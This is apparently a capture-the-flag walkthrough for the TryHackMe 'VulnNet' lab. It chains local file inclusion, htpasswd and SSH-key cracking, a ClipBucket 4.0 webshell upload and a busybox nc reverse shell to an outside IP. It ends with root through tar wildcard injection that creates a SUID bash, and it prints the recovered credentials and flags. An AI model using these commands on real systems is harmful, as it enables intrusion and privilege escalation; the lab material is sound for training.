# VulnNet 

- The purpose of this challenge is to make use of more realistic techniques and include them into a single machine to practice your skills.

- Difficulty: Medium
- Web Language: PHP
- You will have to add a machine IP with domain vulnnet.thm to your /etc/hosts

```
echo "10.48.181.187 vulnnet.thm" | sudo tee -a /etc/hosts
``` 
## Recon

```
 rustscan -a vulnnet.thm -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/light/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.48.181.187:22
Open 10.48.181.187:80
```
- We got only two port open port 80 http and port 22 ssh. 

```
# Nmap 7.95 scan initiated Sun Feb  1 18:21:22 2026 as: /usr/lib/nmap/nmap --privileged -A -p22,80 -oN nmap_scan vulnnet.thm
Nmap scan report for vulnnet.thm (10.48.181.187)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (94%), Linux 5.4 (94%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.11 (92%), Linux 3.7 - 4.19 (92%), Linux 4.12 (92%), Linux 5.0 - 6.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   47.67 ms 192.168.128.1
2   ...
3   48.10 ms vulnnet.thm (10.48.181.187)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  1 18:21:44 2026 -- 1 IP address (1 host up) scanned in 21.43 seconds
```

- Rustscan is very fast, So there are high likely chances it may miss some open ports so after the above nmap scan i performed a nmap all portscan and let it run while i enumerating the other open ports.

- Well i did'nt find any new ports . lets continue with our port 80.
- We can find a site with VULNENET ENTERTAINMENT.

## Port 80 enumeraition

**Web technologies**  
- apache 2.4.29 web server 
- php for backend
- and using jquery version 3.5.1

**Directory bruteforcing**

```
dirsearch -u http://vulnnet.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt 
```
```

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 29999

Output File: /home/light/TryHackMe/VulnNet/reports/http_vulnnet.thm/__26-02-02_11-40-16.txt

Target: http://vulnnet.thm/

[11:40:16] Starting: 
[11:40:17] 301 -  307B  - /js  ->  http://vulnnet.thm/js/
[11:40:17] 301 -  308B  - /css  ->  http://vulnnet.thm/css/
[11:40:17] 301 -  308B  - /img  ->  http://vulnnet.thm/img/
[11:40:19] 301 -  310B  - /fonts  ->  http://vulnnet.thm/fonts/
[11:40:36] 403 -  276B  - /server-status

Task Completed
```

- Inside the /js directory we can see 3 js files.

```
 index__7ed54732.js
 index__d8338055.js
 jquery.min.js
```
- The first 2 js files seems odd  right . 
- before diving into manual enumeration i would like to run my automated [js_juice_finder.sh](https://github.com/Captain-Levi-007/Script_Hunting/blob/main/js_juice_finder.sh) script. that Dumps secrets and endpoints in js files. 

-  It takes js_urls.txt file as input.

```
bash js_juice_finder.sh js_urls.txt 
```
- The results are inside js_out directory.
```
  ~/TryHackMe/VulnNet/js_out ❯ cd ..
  ~/TryHackMe/VulnNet ❯ cd js_out 
  ~/TryHackMe/VulnNet/js_out ❯ ls
js_alive.txt  js_endpoints.txt  js_secrets.txt
  ~/TryHackMe/VulnNet/js_out ❯ cat js_endpoints.txt 
http://broadcast.vulnnet.thm
http://vulnnet.thm/index.php?referer=
```
- In the js_endpoints.txt we found a new subdomains caled **broadcast**.
- Lets add it to out /etc/hosts file. 

- When i try to access the page i got a popup to enter username and password. 
- so the domain using basic http javascript autentication . 

- I tried common creds but it diidnt work . lets move on to the second url .  
```
http://vulnnet.thm/index.php?referer=
```
- Lets see what the perameter **referer** doing.
```
http://vulnnet.thm/index.php?referer=/etc/passwd
```

```
</div>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
	<script src="/js/index__7ed54732.js"></script>
```

- We have LFI(local file inclusion vulnerability from the referer perameter).
- Lets try to read some files to gather infomation about our target machine.
- I tried to read some intresting files about the apache2 webserver. I got to chatgpt and asked for default paths of apache2 webserver that may contians some sensitive info . then it provided my couple of paths 
```
/etc/apache2/apache2.conf
/etc/apache2/envvars
/etc/apache2/ports.conf

/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-available/default-ssl.conf
/etc/apache2/sites-enabled/000-default.conf

/etc/apache2/mods-available/
/etc/apache2/mods-enabled/

etc/apache2/conf-available/
/etc/apache2/conf-enabled/

etc/apache2/.htpasswd
/etc/apache2/htpasswd

/var/www/html/
/var/www/html/.htaccess

/var/log/apache2/access.log
/var/log/apache2/error.log

/etc/ssl/certs/
/etc/ssl/private/
```
- This is **/etc/apache2/sites-enabled/000-default.conf** the main apache2 config file i found something intresting .

```
GET /index.php?referer=/etc/apache2/sites-enabled/000-default.conf HTTP/1.1
Host: vulnnet.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
```
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName vulnnet.thm
	DocumentRoot /var/www/main
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/main>
		Order allow,deny
		allow from all
	</Directory>
</VirtualHost>

<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName broadcast.vulnnet.thm
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/html>
		Order allow,deny
		allow from all
		AuthType Basic
		AuthName "Restricted Content"
		AuthUserFile /etc/apache2/.htpasswd
		Require valid-user
	</Directory>
</VirtualHost>
```

- The subdomain broadcast using basic authentication type and the userfile is stored in the location **/etc/apache2/.htpasswd** . Lets read it.

```
GET /index.php?referer=/etc/apache2/.htpasswd HTTP/1.1
Host: vulnnet.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, 
```
```
</div>

developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
	<script src="/js/index__7ed54732.js">
```
- We found a password hash for user developer save the has to a file hash.txt and feed it to john or hashcat.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (?)     
1g 0:00:00:06 DONE (2026-02-02 13:42) 0.1594g/s 344681p/s 344681c/s 344681C/s =bubbles=..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- **developers:9972761drmfsls**
- With these creds we can login to broadcast subdomain.

- The site running clipbuck which is video streaming software like youtube and netflix . you can stream videos.
- in the site source code i found the version of clipbuck
```
<!-- ClipBucket version 4.0 -->
``` 
- If you visit /actions endpoints in this domain you found a bunch of functionalities.
```
[ ]	admin.php	2021-01-23 20:16 	2.1K	 
[ ]	beats_uploader.php	2021-01-23 20:16 	9.4K	 
[ ]	edit_comment.php	2021-01-23 20:16 	321 	 
[ ]	embed_form_verifier.php	2021-01-23 20:16 	1.2K	 
[ ]	file_downloader.php	2021-01-23 20:16 	9.9K	 
[ ]	file_results.php	2021-01-23 20:16 	2.3K	 
[ ]	file_uploader.php	2021-01-23 20:16 	12K	 
[ ]	getVideoDetails.php	2021-01-23 20:16 	214 	 
[ ]	get_file_size.php	2021-01-23 20:16 	240 	 
[ ]	include_functions.php	2021-01-23 20:16 	3.5K	 
[ ]	photo_uploader.php	2021-01-23 20:16 	11K	 
[ ]	process_video.php	2021-01-23 20:16 	571 	 
[ ]	send_subscription_email.php	2021-01-23 20:16 	488 	 
[ ]	updateVideoViews.php	2021-01-23 20:16 	346 	 
[ ]	update_cb_stats.php	2021-01-23 20:16 	3.6K	 
[ ]	update_configs.php	2021-01-23 20:16 	1.2K	 
[ ]	update_phrase.php	2021-01-23 20:16 	335 	 
[ ]	verify_converted_videos.php	2021-01-23 20:16 	2.5K	 
[ ]	video_convert.php	2021-01-23 20:16 	8.1K	 
[ ]	vote_channel.php	2021-01-23 20:16 	717 	 
```
- Found that this version is vulnerable to command injection , file upload and sql injection. 
- On furthur research i found this [github](https://github.com/abeljm/Exploit-ClipBucket-4-File-Upload.git) page with a poc for the vulnerability.
- The python code in the github uploads a shell.php file with a php webshell . via the actions/beats_uploader.php endpoint .
- The we can access the web shell from the uploded directory 

```
python3 exploit.py broadcast.vulnnet.thm developers 9972761drmfsls                  py_venv
/home/light/TryHackMe/VulnNet/exploit.py:15: SyntaxWarning: invalid escape sequence '\='
  ==/           i     i           \==_

          ==/           i     i           \==_
        /XX/            |\___/|            \XX
      /XXXX\            |XXXXX|            /XXXX
     |XXXXXX\_         _XXXXXXX_         _/XXXXXX|
    XXXXXXXXXXXxxxxxxxXXXXXXXXXXXxxxxxxxXXXXXXXXXXX
   |XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   |XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
    XXXXXX/^^^^"\XXXXXXXXXXXXXXXXXXXXX/^^^^^\XXXXXX
     |XXX|       \XXX/^^\XXXXX/^^\XXX/       |XXX|
       \XX\       \X/    \XXX/    \X/       /XX/
          "\       "      \X/      "      /"
                                     
                                      Autor: AbelJM
                              Web: abeljm.github.io
	
[*] Good Job!!
[*] Shell Uploaded!!

[+] Path Shell: http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/177002867528af57.php

[+] Example Run Shell: http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/177002867528af57.php?cmd=whoami
```

```
curl http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/177002867528af57.php\?cmd\=whoami -H "Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw=="
www-data
```

**Revverse shell**
```
http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/177002867528af57.php?cmd=busybox%20nc%20192.168.133.63%201234%20-e%20/bin/bash
```
- Stabulizing rev shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@vulnnet:/var/www/html/actions/CB_BEATS_UPLOAD_DIR$ ^Z
[1]  + 427825 suspended  nc -lnvp 1234
  ~/TryHackMe/VulnNet ❯ stty raw -echo;fg                                               ✘ TSTP  12m 40s
[1]  + 427825 continued  nc -lnvp 1234
                                      export TERM=xterm
```

## User.txt 

- Users with bash environment 
```
root:x:0:0:root:/root:/bin/bash
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
```
- After some time i found a tar archive file of user server-management.

```
find / -user server-management 2>/dev/null
/home/server-management
/var/backups/ssh-backup.tar.gz
/var/lib/lightdm-data/server-management
```

- I tried to untar it but permission denied . but we have read access over the ssh-backup.tar.gz . so i downloaded it to my local machine 

```
www-data@vulnnet:/var/backups$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```
 wget http://vulnnet.thm:8000/ssh-backup.tar.gz
 ```
- extracting contents of the achive 
```
tar  zxvf ssh-backup.tar.gz 
```

- we got a id_rsa file

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----
```

- lets crach the id_rsa. 
```
ssh2john id_rsa > ssh_hash.txt

cat ssh_hash.txt                                                                                                                                                                                                 5s
id_rsa:$sshng$1$16$6CE1A97A7DAB4829FE59CC561FB2CCC4$1200$99114344bd79b7baaf699c491870c9b1ec27869ef01126c41b17805ad0ab6de21525b40841df19f122b3a6f4cc14bb6d76c7aab06b6df074abb9522afbe3c5a5746b0431b9178ad6e41e950ce54c9353bd278787115d0dedeb3e859db6a367bdeb4aaa8fb624498f63563e4daaae3db943548341b4aa75a1f0ceabf2bf373aff87b8285d78d0b9082d8ebad362be5ee376621a151155c2658d254c957a7d4560c6b113e3688dcc2c1cc1fc695d854e2b8c52cba03b065c30a86244f4c49688e7b43ae580d3273fa94c910eb2c89103345b67eed4f197bb6a7422200776984195c07e941b6df2439ecf44719124124ae986ce4b8b6d0d6d9c6bb48e953eaebfcc3535081772d294f9f1e57236d0dfad43ddbe2c835216ad3c0091db40538ea5a0dc161e0339c3174322817fc0a8b7fcbc0d876e7453616412c449c01e69d520a68d54174bea3a609b0e118c6cec51cb648c1ea48e99cf49eb2ee2549eea7fdfe49d196ce7445ef0c13a9bb7b1c26f31349defa4b89f856636019d6e93656b28f9e6e25f8a4191e7e0b491ce8fcad8e166b9ce0d119f6e696a87da20816a5f945526f078063b09fa9df88704d343d296b4afc104d6629410f8f7c9f8cb856e8f70cd8e1841c70d0add2c3cb7958457e0db02452a36e23b60375f9a41c78d15743bbfc46b7eee5299bbaaded063560216c6894ccbe6b5e3948cd489dec31e15e025f58e493ab29d2af61dc3d37058c598f39ff80c47f70d8188e86db6081184bd2a36521d3b9c3c0350c61532e7340a91beb5ca6b0847c3beee91d379179e94f0ea9efec503feb94b2df14945cf9fd9e1a96ab4f849e12e9a23712b7a733c97ed96b664d3ff2da157a478f063106098c91fa1598b998af0ea93ab2c76fb0b91ba791e83fd6c118e13e9ba10965a7cfe3410d05c8c14cf342f0321f26fb0f5f88b6731eb05f8bf73b9400319eb85975d9d2da85aa4ce59b8a511c27cd6f7e4709a6252b93d009cde4ecae26dc1f4739e3c99edfe4d3fdbbabc5d0d40761923b316707ecf010b064f0df1cc19897487c5ef50e61b4aeaa8247bb01d9bba1a08e2f7b7a1bbe99a0d82bc4fab9c64b7c31b9a10ed265b156b498896762ecb259be9a70445db7027358353782c3871bbef08151d84abe16aed35c955b637f47c078de4e46f6a6de35498864896d2596b11e742924621bc05488b62878f45cabdbd9d444a6496f225b6f8f87cb664d3789bf71f3cd982146fb0d00efc8953eb933c5d5ae4da04e281b2dce9bcb040db4778a37a30c02ea3f7c4e598550e2a7e642665f511000726637011134a166370807aa0c1837322119135dca8a89c41aec8558d193d1921191edc8636806a7acc9983c62db182051a9a59150995ba61824657ce181f703dc026bde0b418d7d3ca03d0944312868cf899322fa9c0b05a26d7304da0f0cf4d7d52aceccd201b95dbf7730b6be413ed3ca3127e9b0dad353b6fa2397931d2c70a32ce2fdd80626188531ce926239397d0656bbf1295c8225663595d55fbbee8b120b10994bc6f6b6303b8f85696e1c237c77d7ea83af5b4224c2ee3e97eccab6b2041eddba3fd8e007164d6a58f9f79a1e20d4fdb424eba481a96f1639b77dbf1953837c680dc2e36a10c0c2d048e084ef1cd3e9fa10c4a9e45609994a9b8956c88f38d0814c4e556ac26c550ea
```

- the use hashcat or john to crack the hash using rockyou.txt

```
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
oneTWO3gOyac     (id_rsa)     
1g 0:00:00:01 DONE (2026-02-02 16:39) 0.7692g/s 3774Kp/s 3774Kc/s 3774KC/s oneal50..one98t7
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- password is **oneTWO3gOyac**
- login to server-management using the ssh key
```
ssh -i id_rsa server-management@vulnnet.thm
```
- Eter the above password. Whoop whoop we got the shell 
- in the home directory we can found the user.txt file.

**users.txt:THM{907e420d979d8e2992f3d7e16bee1e8b}**

## Root.txt

- In the opt directory i found a script **backupsrv.sh**
```
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

- The above script is using tar wild card to archive the files in server-management user documents directory . it is a classic vulnerability . you can google it or just ask the chatgpt .

- all we have to do is create few files names that trick the tar the user trying to execute some commands . lets do it step by step .

- **I want to create a SUID root shell**
```
echo '#!/bin/bash' > /tmp/root.sh
echo 'cp /bin/bash /tmp/rootbash' >> /tmp/root.sh
echo 'chmod +s /tmp/rootbash' >> /tmp/root.sh
chmod +x /tmp/root.sh
```

- we created s root.sh script.
- now navigate to users documents directory and create the following files
```
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh root.sh"
```

- wait for some time, lets the script executed . once it done we can simply get root shell by running hte following command
```
/tmp/rootbash -p
```
```
./rootbash -p
rootbash-4.4# cd /root
rootbash-4.4# ls
root.txt
rootbash-4.4# cat root.txt 
THM{220b671dd8adc301b34c2738ee8295ba}
rootbash-4.4# 
```
**root.txt:THM{220b671dd8adc301b34c2738ee8295ba}**

